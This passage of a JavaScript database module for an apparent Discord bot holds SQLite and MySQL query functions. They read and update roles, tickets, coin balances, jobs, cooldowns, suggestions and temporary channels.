            return new Promise((resolve, reject) => {
                if (user && user.id && user.guild) {
                    if (module.exports.type === 'sqlite') {
                        let roles = module.exports.sqlite.database.prepare('SELECT * FROM saved_roles WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        resolve(roles ? JSON.parse(roles.roles) : undefined);
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM saved_roles WHERE user=? AND guild=?', [user.id, user.guild.id], (err, roles) => {
                            if (err) reject(err);
                            else resolve(roles.length ? JSON.parse(roles[0].roles) : undefined);
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM saved_roles').all());
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM saved_roles', (err, roles) => {
                            if (err) reject(err);
                            else resolve(roles);
                        });
                    }
                }
            });
        },
        getSavedMuteRoles(user) {
            return new Promise((resolve, reject) => {
                if (user && user.id && user.guild) {
                    if (module.exports.type === 'sqlite') {
                        let roles = module.exports.sqlite.database.prepare('SELECT * FROM saved_mute_roles WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        resolve(roles ? JSON.parse(roles.roles) : undefined);
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM saved_mute_roles WHERE user=? AND guild=?', [user.id, user.guild.id], (err, roles) => {
                            if (err) reject(err);
                            else resolve(roles.length ? JSON.parse(roles[0].roles) : undefined);
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM saved_mute_roles').all());
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM saved_mute_roles', (err, roles) => {
                            if (err) reject(err);
                            else resolve(roles);
                        });
                    }
                }
            });
        },
        getGameData(user) {
            return new Promise((resolve, reject) => {
                if (user && user.id && user.guild) {
                    if (module.exports.type === 'sqlite') {
                        const data = module.exports.sqlite.database.prepare('SELECT * FROM game_data WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!data) resolve();
                        else resolve(JSON.parse(data.data));
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM game_data WHERE user=? AND guild=?', [user.id, user.guild.id], (err, data) => {
                            if (err) reject(err);

                            if (!data.length) resolve(undefined);
                            else resolve(JSON.parse(data[0].data));
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM game_data').all());
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM game_data', (err, data) => {
                            if (err) reject(err);
                            else resolve(data);
                        });
                    }
                }
            });
        },
        getUnloadedAddons() {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM unloaded_addons').all());
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT addon_name FROM unloaded_addons', (err, addons) => {
                        if (err) reject(err);
                        else resolve(addons);
                    });
                }
            });
        },
        getBlacklists(user) {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') {
                    let blacklists = module.exports.sqlite.database.prepare('SELECT * FROM blacklists WHERE user=? AND guild=?').get(user.id, user.guild.id);
                    resolve(blacklists && blacklists.commands && blacklists.commands.length ? JSON.parse(blacklists.commands) : undefined);
                }
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM blacklists WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                        if (err) reject(err);
                        else {
                            let blacklists = rows[0];
                            resolve(blacklists && blacklists.commands && blacklists.commands.length ? JSON.parse(blacklists.commands) : undefined);
                        }
                    });
                }
            });
        },
        getIDBans(guild) {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') {
                    let bans = module.exports.sqlite.database.prepare('SELECT * FROM id_bans WHERE guild=?').all(guild.id);
                    resolve(bans ? bans : []);
                }
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM id_bans WHERE guild=?', [guild.id], (err, rows) => {
                        if (err) reject(err);
                        else {
                            resolve(rows);
                        }
                    });
                }
            });
        },
        getReminders() {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') {
                    let reminders = module.exports.sqlite.database.prepare('SELECT * FROM reminders').all();
                    resolve(reminders ? reminders : []);
                }
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM reminders', [], (err, rows) => {
                        if (err) reject(err);
                        else {
                            resolve(rows);
                        }
                    });
                }
            });
        },
        getAnnouncements() {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') {
                    let announcements = module.exports.sqlite.database.prepare('SELECT * FROM announcements').all();
                    resolve(announcements ? announcements : []);
                }
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM announcements', [], (err, rows) => {
                        if (err) reject(err);
                        else {
                            resolve(rows);
                        }
                    });
                }
            });
        },
        getWeeklyCoinsCooldown(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    if (!user.guild) return reject('User is not a member.');

                    if (module.exports.type === 'sqlite') {
                        const cooldown = module.exports.sqlite.database.prepare('SELECT * FROM weeklycoinscooldown WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        resolve(cooldown ? cooldown.date : undefined);
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM weeklycoinscooldown WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (rows.length < 1) resolve(undefined);
                            else resolve(rows[0].date);
                        });
                    }
                } else reject('User required');
            });
        },
        getSuggestions() {
            return new Promise((resolve, reject) => {
                // SQLITE
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM suggestions').all());

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM suggestions', [], (err, suggestions) => {
                    if (err) reject(err);
                    resolve(suggestions);
                });
            });
        },
        getSuggestionByMessage(id) {
            return new Promise((resolve, reject) => {
                if (id) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM suggestions WHERE message=?').get(id));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM suggestions WHERE message=?', [id], (err, suggestions) => {
                        if (err) reject(err);
                        resolve(suggestions.length ? suggestions[0] : undefined);
                    });
                } else reject("[DATABASE (get.getSuggestion)] Invalid inputs");
            });
        },
        getSuggestionByID(id) {
            return new Promise((resolve, reject) => {
                if (id) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM suggestions WHERE id=?').get(id));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM suggestions WHERE id=?', [id], (err, suggestions) => {
                        if (err) reject(err);
                        resolve(suggestions.length ? suggestions[0] : undefined);
                    });
                } else reject("[DATABASE (get.getSuggestion)] Invalid inputs");
            });
        },
        getBugreport(message_id) {
            return new Promise((resolve, reject) => {
                if (message_id) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM bugreports WHERE message=?').get(message_id));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM bugreports WHERE message=?', [message_id], (err, bugreports) => {
                        if (err) reject(err);
                        resolve(bugreports.length ? bugreports[0] : undefined);
                    });
                } else reject("[DATABASE (get.getBugreport)] Invalid inputs");
            });
        },
        getLockedChannel(channel_id) {
            return new Promise((resolve, reject) => {
                if (channel_id) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM locked_channels WHERE channel=?').get(channel_id));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM locked_channels WHERE channel=?', [channel_id], (err, channels) => {
                        if (err) reject(err);
                        resolve(channels.length ? channels[0] : undefined);
                    });
                } else reject("[DATABASE (get.getLockedChannel)] Invalid inputs");
            });
        },
        getInviteData(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') {
                        let data = module.exports.sqlite.database.prepare('SELECT * FROM invites WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        resolve(data || { regular: 0, bonus: 0, leaves: 0, fake: 0 });
                    }

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM invites WHERE user=? AND guild=?', [user.id, user.guild.id], (err, data) => {
                        if (err) reject(err);
                        resolve(data.length ? data[0] : { regular: 0, bonus: 0, leaves: 0, fake: 0 });
                    });
                } else {
                    // SQLITE
                    if (module.exports.type === 'sqlite') {
                        let data = module.exports.sqlite.database.prepare('SELECT * FROM invites').all();
                        resolve(data);
                    }

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM invites', [], (err, data) => {
                        if (err) reject(err);
                        resolve(data);
                    });
                }
            });
        },
        getJoins(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM joins WHERE user=? AND guild=?').all(user.id, user.guild.id));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM joins WHERE user=? AND guild=?', [user.id, user.guild.id], (err, data) => {
                        if (err) reject(err);
                        resolve(data.length ? data : undefined);
                    });
                } else reject("[DATABASE (get.getJoins)] Invalid inputs");
            });
        },
        getRoleMenus() {
            return new Promise((resolve, reject) => {
                // SQLITE
                if (module.exports.type === 'sqlite') {
                    let data = module.exports.sqlite.database.prepare('SELECT * FROM role_menus').all();
                    resolve(data);
                }

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM role_menus', [], (err, data) => {
                    if (err) reject(err);
                    resolve(data);
                });
            });
        },
        getRoleMenu(message) {
            return new Promise((resolve, reject) => {
                // SQLITE
                if (module.exports.type === 'sqlite') {
                    let data = module.exports.sqlite.database.prepare('SELECT * FROM role_menus WHERE message=?').get(message);
                    resolve(data);
                }

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM role_menus WHERE message=?', [message], (err, data) => {
                    if (err) reject(err);
                    resolve(data[0]);
                });
            });
        },
        checkChannelCommandDataExists(command) {
            return new Promise((resolve, reject) => {
                // SQLITE
                if (module.exports.type === 'sqlite') {
                    let data = module.exports.sqlite.database.prepare('SELECT * FROM command_channels WHERE command=?').get(command);
                    resolve(!!data);
                }

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM command_channels WHERE command=?', [command], (err, data) => {
                    if (err) reject(err);
                    resolve(!!data[0]);
                });
            });
        },
        getCommandChannelData(command) {
            return new Promise(async (resolve) => {
                let defaultData = { command: "_global", type: "blacklist", channels: [] };
                // SQLITE
                if (module.exports.type === 'sqlite') {
                    if (await module.exports.get.checkChannelCommandDataExists(command)) {
                        let data = module.exports.sqlite.database.prepare('SELECT * FROM command_channels WHERE command=?').get(command);
                        if (data) data.channels = JSON.parse(data.channels);
                        resolve(data);
                    } else {
                        let data = module.exports.sqlite.database.prepare('SELECT * FROM command_channels WHERE command=?').get("_global");
                        if (data) data.channels = JSON.parse(data.channels);
                        else module.exports.update.commands.channels.add(defaultData);
                        resolve(data || defaultData);
                    }
                }

                // MYSQL
                if (module.exports.type === 'mysql') {
                    if (await module.exports.get.checkChannelCommandDataExists(command)) {
                        module.exports.mysql.database.query('SELECT * FROM command_channels WHERE command=?', [command], (err, data) => {
                            if (data && data.length) data[0].channels = JSON.parse(data[0].channels);
                            resolve(data[0]);
                        });
                    } else {
                        module.exports.mysql.database.query('SELECT * FROM command_channels WHERE command=?', ["_global"], (err, data) => {
                            if (data && data.length) data[0].channels = JSON.parse(data[0].channels);
                            else module.exports.update.commands.channels.add(defaultData);
                            resolve(data[0] || defaultData);
                        });
                    }
                }
            });
        },
        getMessageCount(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    if (!user.guild) return reject('User is not a member.');

                    // SQLITE
                    if (module.exports.type === 'sqlite') {
                        const data = module.exports.sqlite.database.prepare('SELECT * FROM message_counts WHERE user=? AND guild=?').get(user.id, user.guild.id);

                        if (!data) {
                            module.exports.update.messages.increase(user, 0);
                            resolve(0);
                        } else resolve(data.count);
                    }

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM message_counts WHERE user=? AND guild=?', [user.id, user.guild.id], (err, data) => {
                        if (err) reject(err);
                        if (data.length < 1) {
                            module.exports.update.messages.increase(user, 0);
                            resolve(0);
                        }
                        else resolve(data[0].count);
                    });
                } else {

                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM message_counts").all());

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM message_counts', (err, data) => {
                        if (err) reject(err);
                        resolve(data);
                    });
                }
            });
        },
        getVoiceData(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') {
                        let data = module.exports.sqlite.database.prepare('SELECT * FROM voice_time WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        resolve(data);
                    }

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM voice_time WHERE user=? AND guild=?', [user.id, user.guild.id], (err, data) => {
                        if (err) reject(err);
                        resolve(data[0]);
                    });
                } else {
                    //SQLITE
                    if (module.exports.type === 'sqlite') {
                        let data = module.exports.sqlite.database.prepare('SELECT * FROM voice_time').all();
                        resolve(data);
                    }

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM voice_time', [], (err, data) => {
                        if (err) reject(err);
                        resolve(data);
                    });
                }
            });
        },
        getTempchannels() {
            return new Promise((resolve, reject) => {
                //SQLITE
                if (module.exports.type === 'sqlite') {
                    let data = module.exports.sqlite.database.prepare('SELECT * FROM temp_channels').all();
                    resolve(data);
                }

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM temp_channels', [], (err, data) => {
                    if (err) reject(err);
                    resolve(data);
                });
            });
        },
        getTempchannelByChannel(channel_id) {
            return new Promise((resolve, reject) => {
                if (!channel_id) return reject("Invalid parameters");

                //SQLITE
                if (module.exports.type === 'sqlite') {
                    let data = module.exports.sqlite.database.prepare('SELECT * FROM temp_channels WHERE channel_id=?').get(channel_id);
                    if (data) data.allowed_users = JSON.parse(data.allowed_users);
                    resolve(data);
                }

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM temp_channels WHERE channel_id=?', [channel_id], (err, data) => {
                    if (err) reject(err);
                    if (data && data.length) data[0].allowed_users = JSON.parse(data[0].allowed_users);
                    resolve(data[0]);
                });
            });
        },
        getTempchannelByUser(user) {
            return new Promise((resolve, reject) => {
                if (!user) return reject("Invalid parameters");

                //SQLITE
                if (module.exports.type === 'sqlite') {
                    let data = module.exports.sqlite.database.prepare('SELECT * FROM temp_channels WHERE owner=?').get(user);
                    if (data) data.allowed_users = JSON.parse(data.allowed_users);
                    resolve(data);
                }

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM temp_channels WHERE owner=?', [user], (err, data) => {
                    if (err) reject(err);
                    if (data && data.length) data[0].allowed_users = JSON.parse(data[0].allowed_users);
                    resolve(data[0]);
                });
            });
        }
    },
    update: {
        prefixes: {
            async updatePrefix(guild, newprefix) {
                return new Promise(async (resolve, reject) => {
                    if ([guild, newprefix].some(t => !t)) return reject('Invalid parameters');

                    if (module.exports.type === 'sqlite') {
                        const prefixes = module.exports.sqlite.database.prepare('SELECT * FROM prefixes WHERE guild=?').all(guild);
                        if (prefixes.length > 0) {
                            module.exports.sqlite.database.prepare('UPDATE prefixes SET prefix=? WHERE guild=?').run(newprefix, guild);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('INSERT INTO prefixes(guild, prefix) VALUES(?, ?)').run(guild, newprefix);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM prefixes WHERE guild=?', [guild], (err, prefixes) => {
                            if (err) reject(err);
                            if (prefixes.length > 0) {
                                module.exports.mysql.database.query('UPDATE prefixes SET prefix=? WHERE guild=?', [newprefix, guild], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('INSERT INTO prefixes(guild, prefix) VALUES(?, ?)', [guild, newprefix], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            }
        },
        tickets: {
            addedUsers: {
                remove(ticket, userid) {
                    if (!userid) return console.log('[Database.js#addedUsers#remove] Invalid inputs');
                    return new Promise((resolve, reject) => {
                        if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('DELETE FROM ticketsaddedusers WHERE ticket=? AND user=?').run(ticket, userid));
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('DELETE FROM ticketsaddedusers WHERE ticket=? AND user=?', [ticket, userid], (err) => {
                                if (err) reject(err);
                                resolve();
                            });
                        }
                    });
                },
                add(ticket, userid) {
                    if (Object.values(arguments).some(a => !a)) return console.log('[Database.js#addedUsers#add] Invalid inputs');
                    return new Promise((resolve, reject) => {
                        if (module.exports.type === 'sqlite') {
                            module.exports.sqlite.database.prepare('INSERT INTO ticketsaddedusers(user, ticket) VALUES(?, ?)').run(userid, ticket);
                            resolve();
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('INSERT INTO ticketsaddedusers(user, ticket) VALUES(?, ?)', [userid, ticket], (err) => {
                                if (err) reject(err);
                                resolve();
                            });
                        }
                    });
                }
            },
            createTicket(data) {
                if (Object.values(arguments).some(a => !a)) return console.log('[Database.js#createTicket] Invalid inputs');
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('INSERT INTO tickets(guild, channel_id, channel_name, creator, reason) VALUES(?, ?, ?, ?, ?)').run(data.guild, data.channel_id, data.channel_name, data.creator, data.reason);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('INSERT INTO tickets(guild, channel_id, channel_name, creator, reason) VALUES(?, ?, ?, ?, ?)', [data.guild, data.channel_id, data.channel_name, data.creator, data.reason], (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            },
            removeTicket(id) {
                if (Object.values(arguments).some(a => !a)) return console.log('[Database.js#removeTicket] Invalid inputs');
                return new Promise((resolve, reject) => {
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('DELETE FROM tickets WHERE channel_id=?').run(id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('DELETE FROM tickets WHERE channel_id=?', [id], (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            },
        },
        status: {
            setStatus(type, activity) {
                return new Promise(async (resolve, reject) => {
                    const bot = Utils.variables.bot;
                    if (activity) {
                        bot.user.setActivity(await Utils.getStatusPlaceholders(activity.replace("https://", "")), { type: type.toUpperCase(), url: type.toUpperCase() == "STREAMING" ? activity : undefined });
                    } else bot.user.setActivity();
                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE status SET type=?, activity=?').run(type, activity);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE status SET type=?, activity=?', [type, activity], (err) => {
                            if (err) reject(err);
                            resolve();
                        });
                    }
                });
            }
        },
        coins: {
            updateCoins(user, amt, action) {
                return new Promise(async (resolve, reject) => {
                    if ([user, user.guild, action].some(t => !t)) return reject('Invalid parameters in updateCoins');
                    if (module.exports.type === 'sqlite') {
                        const coins = module.exports.sqlite.database.prepare('SELECT * FROM coins WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        let newcoins;
                        if (coins) {
                            if (action == 'add') newcoins = coins.coins + amt;
                            if (action == 'remove') newcoins = coins.coins - amt;
                            if (action == 'set') newcoins = amt;
                            if (newcoins < 0) newcoins = 0;

                            module.exports.sqlite.database.prepare('UPDATE coins SET coins=? WHERE user=? AND guild=?').run(newcoins, user.id, user.guild.id);
                            resolve();
                        } else {
                            if (['add', 'set'].includes(action)) newcoins = amt;
                            if (action == 'remove') newcoins = 0;
                            if (newcoins < 0) newcoins = 0;

                            module.exports.sqlite.database.prepare('INSERT INTO coins(user, guild, coins) VALUES(?, ?, ?)').run(user.id, user.guild.id, newcoins);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM coins WHERE user=? AND guild=?', [user.id, user.guild.id], (err, coins) => {
                            if (err) reject(err);
                            let newcoins;
                            if (coins.length > 0) {
                                if (action == 'add') newcoins = coins[0].coins + amt;
                                if (action == 'remove') newcoins = coins[0].coins - amt;
                                if (action == 'set') newcoins = amt;
                                if (newcoins < 0) newcoins = 0;

                                module.exports.mysql.database.query('UPDATE coins SET coins=? WHERE user=? AND guild=?', [newcoins, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                if (['add', 'set'].includes(action)) newcoins = amt;
                                if (action == 'remove') newcoins = 0;
                                if (newcoins < 0) newcoins = 0;

                                module.exports.mysql.database.query('INSERT INTO coins(user, guild, coins) VALUES(?, ?, ?)', [user.id, user.guild.id, newcoins], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            },
            setJob(user, job, tier) {
                return new Promise(async (resolve, reject) => {
                    //if ([user, user.guild, job, tier].some(t => !t)) return reject('Invalid parameters in setUserJob');

                    if (module.exports.type === 'sqlite') {
                        const jobFound = module.exports.sqlite.database.prepare('SELECT * FROM jobs WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!jobFound) {
                            module.exports.sqlite.database.prepare('INSERT INTO jobs(user, guild, job, tier, amount_of_times_worked) VALUES(?, ?, ?, ?, ?)').run(user.id, user.guild.id, job, tier, 0);
                            module.exports.sqlite.database.prepare('INSERT INTO global_times_worked(user, guild, times_worked) VALUES(?, ?, ?)').run(user.id, user.guild.id, 0);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('UPDATE jobs SET tier=? WHERE user=? AND guild=?').run(tier, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM jobs WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (!rows[0]) {
                                module.exports.mysql.database.query('INSERT INTO jobs(user, guild, job, tier, amount_of_times_worked) VALUES(?, ?, ?, ?, ?)', [user.id, user.guild.id, job, tier, 0], (err) => {
                                    if (err) reject(err);
                                    module.exports.sqlite.database.prepare('INSERT INTO global_times_worked(user, guild, times_worked) VALUES(?, ?, ?)', [user.id, user.guild.id, 0], (e) => {
                                        if (e) reject(e);
                                        resolve();
                                    });
                                });
                            } else {
                                module.exports.mysql.database.query('UPDATE jobs SET tier=? WHERE user=? AND guild=?', [tier, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            },
            setWorkCooldown(user, date) {
                return new Promise(async (resolve, reject) => {
                    if ([user, user.guild, date].some(t => !t)) return reject('Invalid parameters in setWorkCooldown');

                    if (module.exports.type === 'sqlite') {
                        const cooldown = module.exports.sqlite.database.prepare('SELECT * FROM job_cooldowns WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (!cooldown) {
                            module.exports.sqlite.database.prepare('INSERT INTO job_cooldowns(user, guild, date) VALUES(?, ?, ?)').run(user.id, user.guild.id, date);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('UPDATE job_cooldowns SET date=? WHERE user=? AND guild=?').run(date, user.id, user.guild.id);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM job_cooldowns WHERE user=? AND guild=?', [user.id, user.guild.id], (err, cooldown) => {
                            if (err) reject(err);
                            if (!cooldown.length) {
                                module.exports.mysql.database.query('INSERT INTO job_cooldowns(user, guild, date) VALUES(?, ?, ?)', [user.id, user.guild.id, date], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('UPDATE job_cooldowns SET date=? WHERE user=? AND guild=?', [date, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }

                        });
                    }
                });
            },
            setWorkAmount(user, times) {
                return new Promise(async (resolve, reject) => {
                    if ([user, user.guild, times].some(t => !t)) return reject('Invalid parameters in setWorkAmount');

                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('UPDATE jobs SET amount_of_times_worked=? WHERE user=? AND guild=?').run(times, user.id, user.guild.id);

                        let global = module.exports.sqlite.database.prepare('SELECT * FROM global_times_worked WHERE user=? AND guild=?').get(user.id, user.guild.id);

                        if (global) {
                            module.exports.sqlite.database.prepare('UPDATE global_times_worked SET times_worked=? WHERE user=? AND guild=?').run((global.times_worked + 1), user.id, user.guild.id);
                        } else {
                            module.exports.sqlite.database.prepare("INSERT INTO global_times_worked(user, guild, times_worked) VALUES(?, ?, ?)").run(user.id, user.guild.id, times);
                        }

                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('UPDATE jobs SET amount_of_times_worked=? WHERE user=? AND guild=?', [times, user.id, user.guild.id], (err) => {
                            if (err) reject(err);

                            module.exports.mysql.database.query('SELECT * FROM global_times_worked WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                                let global = rows[0];

                                if (global) {
                                    module.exports.mysql.database.query('UPDATE global_times_worked SET times_worked=? WHERE user=? AND guild=?', [(global.times_worked + times), user.id, user.guild.id], (e) => {
                                        if (e) reject(e);
                                        resolve();
                                    });
                                } else {
                                    module.exports.mysql.database.query('INSERT INTO global_times_worked(user, guild, times_worked) VALUES(?, ?, ?)', [user.id, user.guild.id, times], (e) => {
                                        if (e) reject(e);
                                        resolve();
                                    });
                                }
                            });
                        });
                    }
                });
            },
            quitJob(user) {
                return new Promise(async (resolve, reject) => {
                    if ([user, user.guild].some(t => !t)) return reject('Invalid parameters in quitJob');

                    if (module.exports.type === 'sqlite') {
                        module.exports.sqlite.database.prepare('DELETE FROM jobs WHERE user=? AND guild=?').run(user.id, user.guild.id);
                        resolve();
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM jobs WHERE user=? AND guild=?', [user.id, user.guild.id], (err) => {
                            if (err) reject(err);
                            module.exports.mysql.database.query('DELETE FROM jobs WHERE user=? AND guild=?', [user.id, user.guild.id], (err) => {
                                if (err) reject(err);
                                resolve();
                            });
                        });
                    }
                });
            },
            setDailyCooldown(user, date) {
                return new Promise(async (resolve, reject) => {
                    if ([user, user.guild, date].some(t => !t)) return reject('Invalid parameters in setDailyCooldown');

                    if (module.exports.type === 'sqlite') {
                        const cooldown = module.exports.sqlite.database.prepare('SELECT * FROM dailycoinscooldown WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (cooldown) {
                            module.exports.sqlite.database.prepare('UPDATE dailycoinscooldown SET date=? WHERE user=? AND guild=?').run(date, user.id, user.guild.id);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('INSERT INTO dailycoinscooldown(user, guild, date) VALUES(?,?,?)').run(user.id, user.guild.id, date);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM dailycoinscooldown WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (rows.length > 0) {
                                module.exports.mysql.database.query('UPDATE dailycoinscooldown SET date=? WHERE user=? AND guild=?', [date, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
                                module.exports.mysql.database.query('INSERT INTO dailycoinscooldown(user, guild, date) VALUES(?,?,?)', [user.id, user.guild.id, date], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            }
                        });
                    }
                });
            },
            setWeeklyCooldown(user, date) {
                return new Promise(async (resolve, reject) => {
                    if ([user, user.guild, date].some(t => !t)) return reject('Invalid parameters in setWeeklyCooldown');

                    if (module.exports.type === 'sqlite') {
                        const cooldown = module.exports.sqlite.database.prepare('SELECT * FROM weeklycoinscooldown WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        if (cooldown) {
                            module.exports.sqlite.database.prepare('UPDATE weeklycoinscooldown SET date=? WHERE user=? AND guild=?').run(date, user.id, user.guild.id);
                            resolve();
                        } else {
                            module.exports.sqlite.database.prepare('INSERT INTO weeklycoinscooldown(user, guild, date) VALUES(?,?,?)').run(user.id, user.guild.id, date);
                            resolve();
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM weeklycoinscooldown WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (rows.length > 0) {
                                module.exports.mysql.database.query('UPDATE weeklycoinscooldown SET date=? WHERE user=? AND guild=?', [date, user.id, user.guild.id], (err) => {
                                    if (err) reject(err);
                                    resolve();
                                });
                            } else {
